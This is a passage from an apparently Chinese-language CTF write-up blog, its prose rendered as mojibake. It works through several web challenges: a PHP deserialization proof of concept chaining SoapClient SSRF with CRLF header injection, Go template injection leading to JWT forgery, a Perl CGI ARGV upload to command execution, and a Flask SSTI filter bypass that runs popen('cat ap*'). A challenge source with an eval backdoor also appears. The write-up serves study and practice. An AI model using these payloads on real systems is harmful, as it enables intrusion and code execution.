class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$columns</span>)</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SoapFault</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>] = <span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=oevfk4u8cpvu893e1jhj176n76&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;ameuu^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>] = <span class="keyword">new</span> Typecho_Db_Query();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span> = str_ireplace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>,<span class="string">&#x27;%5c%30%30&#x27;</span>,urlencode(<span class="variable">$a</span>));</span><br><span class="line">var_dump(urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$V</span> = <span class="string">&#x27;O:13:&quot;HelloWorld_DB&quot;:1:&#123;S:26:&quot;\00HelloWorld_DB\00coincidence&quot;;a:2:&#123;s:5:&quot;hello&quot;;O:16:&quot;Typecho_Db_Query&quot;:2:&#123;S:26:&quot;\00Typecho_Db_Query\00_adapter&quot;;O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:3:&quot;aaa&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:79:&quot;ameuu</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=oevfk4u8cpvu893e1jhj176n76&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;S:30:&quot;\00Typecho_Db_Query\00_sqlPreBuild&quot;;a:1:&#123;s:6:&quot;action&quot;;s:6:&quot;SELECT&quot;;&#125;&#125;s:5:&quot;world&quot;;s:0:&quot;&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(<span class="variable">$V</span>));</span><br><span class="line"><span class="comment">//echo(urlencode($V));</span></span><br></pre></td></tr></table></figure>

<h2 id="LineCTF2022-gotm"><a href="#LineCTF2022-gotm" class="headerlink" title="[LineCTF2022]gotm"></a>[LineCTF2022]gotm</h2><ul>
<li>gogogo</li>
</ul>
<p>åªæœ‰ä¸€ä¸ª<code>main.go</code>ï¼Œç›´æ¥æ¥çœ‹æ‰€æœ‰çš„æ–¹æ³•</p>
<p>æ ¹ç›®å½•ä¸‹ï¼å°†<code>X-Token</code>è¿›è¡Œjwtè§£ç ä¹‹åç„¶åè¿›è¡Œèµ‹å€¼ï¼Œè€Œ<code>template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</code>ä¸­å­˜åœ¨SSTIæ³¨å…¥</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">root_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(w, &amp;acc)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨å†ŒåŠŸèƒ½ï¼Œä¼ idæˆ–è€…pwè¿›è¡Œæ³¨å†Œ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">regist_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> get_account(uid).id != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		w.WriteHeader(http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">4</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	new_acc := Account&#123;uid, upw, <span class="literal">false</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, new_acc)</span><br><span class="line"></span><br><span class="line">	p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">	res, err := json.Marshal(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	w.Write(res)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç™»å½•åŠŸèƒ½ï¼Œ<code>jwt_encode</code>å¯¹ç™»å½•çš„è´¦æˆ·çš„idä»¥åŠæ˜¯å¦ä¸ºadminè¿›è¡ŒjwtåŠ å¯†</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">auth_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">1024</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	user_acc := get_account(uid)</span><br><span class="line">	<span class="keyword">if</span> user_acc.id != <span class="string">&quot;&quot;</span> &amp;&amp; user_acc.pw == upw &#123;</span><br><span class="line">		token, err := jwt_encode(user_acc.id, user_acc.is_admin)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		p := TokenResp&#123;<span class="literal">true</span>, token&#125;</span><br><span class="line">		res, err := json.Marshal(p)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		w.Write(res)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	w.WriteHeader(http.StatusForbidden)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®åˆ¤æ–­tokenï¼Œå¦‚æœæ˜¯adminå°±ç›´æ¥è¿”å›flag</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flag_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, is_admin := jwt_decode(token)</span><br><span class="line">		<span class="keyword">if</span> is_admin == <span class="literal">true</span> &#123;</span><br><span class="line">			p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;Hi &quot;</span> + id + <span class="string">&quot;, flag is &quot;</span> + flag&#125;</span><br><span class="line">			res, err := json.Marshal(p)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			&#125;</span><br><span class="line">			w.Write(res)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			w.WriteHeader(http.StatusForbidden)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä½“çš„æ€è·¯å¤§æ¦‚éƒ½æ‡‚äº†</p>
<p>æ€»çš„æ¥è¯´å°±æ˜¯å…ˆæ³¨å†Œè´¦å·ï¼Œå¹¶åœ¨<code>/</code>ç›®å½•ä¸‹sstiæ³¨å…¥è·å–<code>secret_key</code>ï¼Œç„¶åä¼ªé€ jwtè·å–flag</p>
<h3 id="go-ssti"><a href="#go-ssti" class="headerlink" title="go ssti"></a>go ssti</h3><p><img src="https://img-blog.csdnimg.cn/c72590ede7034490a56340b59f255818.png" alt="image-20220620163230287"></p>
<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><ul>
<li>perl CGI</li>
<li>perl ARGVæ–‡ä»¶ä¸Šä¼  RCE</li>
</ul>
<h3 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h3><p><a href="https://www.freesion.com/article/35001374751/">https://www.freesion.com/article/35001374751/</a></p>
<h3 id="ARGV"><a href="#ARGV" class="headerlink" title="ARGV"></a>ARGV</h3><p><a href="https://www.jianshu.com/p/51f083b802f0">https://www.jianshu.com/p/51f083b802f0</a></p>
<h3 id="åšé¢˜-1"><a href="#åšé¢˜-1" class="headerlink" title="åšé¢˜"></a>åšé¢˜</h3><p>ä¸‡èƒ½çš„buuç›´æ¥ç»™äº†æºç ï¼Œåˆ©ç”¨CGIæ–‡ä»¶ä¸Šä¼ </p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cgi-&gt;upload(<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">my</span> $file = $cgi-&gt;param(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span> (&lt;$file&gt;) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;$_&quot;</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>param</code></p>
<p><img src="https://img-blog.csdnimg.cn/8d25e9f329a14395bc281f8dcc47818f.png"></p>
<p><a href="https://blog.csdn.net/chizhaji/article/details/113920025%EF%BC%9A">https://blog.csdn.net/chizhaji/article/details/113920025ï¼š</a></p>
<p><img src="https://img-blog.csdnimg.cn/ff435b26644c4acf89c80032f10817ec.png" alt="image-20220621102712383"></p>
<p>æ‰€ä»¥å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼ŒæŠ“åŒ…ï¼Œå¤åˆ¶æ•°æ®åŒ…ç±»å‹å°†æ–‡ä»¶ååˆ æ‰ï¼Œå†…å®¹ä¸º<code>ARGV</code>ï¼Œä½¿å¾—å¯ä»¥è·å–åˆ°getæ–¹å¼æ‰€ä¼ çš„å€¼å¹¶å‘½ä»¤æ‰§è¡Œï¼ˆåŸç†è¿˜åœ¨å­¦</p>
<h2 id="CISCN2019-Web2"><a href="#CISCN2019-Web2" class="headerlink" title="[CISCN2019]Web2"></a>[CISCN2019]Web2</h2><p>æ²¡æœ‰æºç </p>
<p>æ³¨å†Œç™»å½•ä¹‹åå¯ä»¥å‘è¡¨æ–‡ç« ï¼Œæ„Ÿè§‰å¯èƒ½å­˜åœ¨XSSï¼Œå¯ä»¥å‘ç°åœ¨åé¦ˆçš„åœ°æ–¹ä¼šè®©ç®¡ç†å‘˜ç‚¹å‡»é“¾æ¥ï¼Œé‚£ä¹ˆä¸å°±æ˜¯å­˜åœ¨CSRFå˜›</p>
<p>ä½†æ˜¯æ„é€ ç‚¹åœ¨å“ªé‡Œå‘¢ã€‚ä»”ç»†æƒ³ä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ä¹Ÿå°±åªæœ‰å‘è¡¨æ–‡ç« äº†ï¼Œè¯´æ˜åº”è¯¥æ˜¯æ„é€ æ–‡ç« å†…å®¹ï¼Œå› ä¸ºå¯æ“ä½œæ€§å¾ˆå¤§ï¼Œæ‰€ä»¥å¯èƒ½å¯ä»¥è‡ªè¡Œå†™ä¸€ä¸ªè¡¨å•ï¼Œè®©ç®¡ç†å‘˜ç‚¹å‡»å®ç°ç®¡ç†å‘˜ç™»å½•</p>
<p>é‚£ä¹ˆè¯¥å†™ä¸€ä¸ªä»€ä¹ˆæ ·çš„è¡¨å•æ‰èƒ½å¤Ÿå®ç°æ</p>
<blockquote>
<p>xsså¹³å°æ³¨å†Œå¤±è´¥ å‘œå“‡</p>
</blockquote>
<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å…ˆæ‰“å¼€é¶åœºï¼Œå‘ç°ä¸€å¼€å§‹æ€ä¹ˆè¾“å…¥éƒ½æ²¡æœ‰ååº”ï¼Œç›´æ¥post </p>
<p><code>&#123;&#123;config&#125;&#125;</code>ä¹‹åä¼šå‘ç°å­˜åœ¨flagï¼Œå…¶å®è¿™é‡Œç›´æ¥ç”¨é¢˜ç›®å·²ç»ç»™çš„è„šæœ¬å°±å¯ä»¥è·‘å‡ºflagäº†</p>
<p>ä½†æ˜¯è¦å¥½å¥½å­¦ä¹ ï¼ï¼ï¼ï¼</p>
<p>ç›´æ¥ç»§ç»­<code>SSTI</code></p>
<p>æµ‹è¯•ä¸€ä¸‹å¯ä»¥å‘ç°<code>.|_|&#39;</code>è¢«banäº†ï¼Œå•å¼•å·è¢«banæ²¡ä»€ä¹ˆå…³ç³»å¯ä»¥ç”¨<code>&quot;</code>æ›¿ä»£ï¼Œä½†æ˜¯<code>.</code>å’Œ<code>_</code>ä¸€èˆ¬æ˜¯å¿…ç„¶ä¼šç”¨åˆ°çš„ï¼Œä¸èƒ½è¢«æ›¿ä»£ï¼Œ<code>.</code>å¯ä»¥ç”¨<code>[]</code>æ¥ä»£æ›¿ï¼Œè€Œ<code>_</code>å¯ä»¥åˆ©ç”¨åå…­è¿›åˆ¶ç»•è¿‡<code>_|\x5F</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;  &quot;&quot;.__class__</span><br><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclassed\x5f\x5f&quot;]()&#125;&#125; &quot;&quot;.__class__.__base__.__subclasses__() æ‰¾å¯åˆ©ç”¨çš„åŒ…ï¼Œè¿™é‡Œä¸èƒ½ç”¨warnings.catch_warningsï¼Œåœ¨åé¢æ‰¾osçš„æ—¶å€™æ‰¾ä¸åˆ°è¿™é‡Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼Œå¸ˆå‚…ç›´æ¥ç”¨çš„æ˜¯ç±»os._wrap_close</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f75889d3ec5248768692805a2339022b.png" alt="image-20220621141109765"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclassed\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat ap*&quot;)[&quot;read&quot;]()&#125;&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>åˆ†ææºç ï¼Œ<code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;folow @osminogka.ann on instagram =)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Tiaonmmn don&#x27;t remember to remove this part on deploy so nobody will solve that hehe</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def encode(line, key, key2):</span></span><br><span class="line"><span class="string">    return &#x27;&#x27;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.config[&#x27;flag&#x27;] = encode(&#x27;&#x27;, &#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;, &#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">nicknames = [<span class="string">&#x27;Ëœâ€*Â°â˜…â˜†â˜…_%s_â˜…â˜†â˜…Â°Â°*&#x27;</span>, <span class="string">&#x27;%s ~â™¡â“›â“â“¥â“”â™¡~&#x27;</span>, <span class="string">&#x27;%s Ğ’ÃªÑ‡Ò£Ã¸ Ğ² Ã¸Ä¤Ğ»Ã¢Ğ¹Ä¤Ã©&#x27;</span>, <span class="string">&#x27;â™ª â™ª â™ª %s â™ª â™ª â™ª &#x27;</span>, <span class="string">&#x27;[â™¥â™¥â™¥%sâ™¥â™¥â™¥]&#x27;</span>, <span class="string">&#x27;%s, kOÑ‚OÂ®AÑ )(Ğ¾Ğ¢ĞµĞ›@ Â©4@$tÑŒĞ¯&#x27;</span>, <span class="string">&#x27;â™”%sâ™”&#x27;</span>, <span class="string">&#x27;[â™‚+â™‚=â™¥]%s[â™‚+â™‚=â™¥]&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="comment"># éœ€è¦è¯·æ±‚æ–¹å¼ä¸ºPOSTæ‰èƒ½getåˆ°nickname</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = request.values.get(<span class="string">&#x27;nickname&#x27;</span>)</span><br><span class="line">            <span class="built_in">id</span> = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(nicknames) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> p != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Your nickname contains restricted characters!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(nicknames[<span class="built_in">id</span>] % p) <span class="comment"># æ³¨å…¥</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Exception&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹å°±æ˜¯åŠ å¯†çš„æ–¹æ³•äº†ï¼Œå¯ä»¥é€šè¿‡<code>&#123;&#123;config&#125;&#125;</code>å¾—åˆ°è¢«åŠ å¯†ä¹‹åçš„flagçš„å€¼</p>
<blockquote>
<p>-M7\x10w\x12287\x00qfx\x0eL\x0cnR(D\x1bN\\x17{2\x06h\x02\r\x10\t#P.|\x11l\x10[\x17G</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/75af702e38fc44f387ab384926584e33.png" alt="image-20220621141328046"></p>
<h2 id="è“å¸½æ¯-2021-One-Pointer-PHP"><a href="#è“å¸½æ¯-2021-One-Pointer-PHP" class="headerlink" title="[è“å¸½æ¯ 2021]One Pointer PHP"></a>[è“å¸½æ¯ 2021]One Pointer PHP</h2><p><code>user.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

